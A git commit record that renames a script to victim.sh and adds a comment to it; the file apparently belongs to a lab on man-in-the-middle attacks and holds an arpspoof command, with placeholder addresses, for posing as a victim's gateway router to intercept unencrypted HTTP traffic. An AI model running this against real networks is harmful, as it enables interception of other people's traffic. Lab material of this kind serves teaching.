1bfba1b21cc702c16604af23ccae20097ceb3829
Sachin Deshpande <35118726+sachincdeshpande@users.noreply.github.com>
2020-08-12 11:00:11 -0700

    Update and rename script2.sh to victim.sh

--- victim.sh
+++ victim.sh
@@ -1,4 +1,5 @@
 # in a new (third) terminal enable arpspoofing
 # trick the victim into thinking that you are the gateway router,
 # so it sends data over an unencrypted http connection
+# requires the results from nmap in forward_table.sh to run
 arpspoof -i eth0 -t <Victim IP> <Gateway IP>
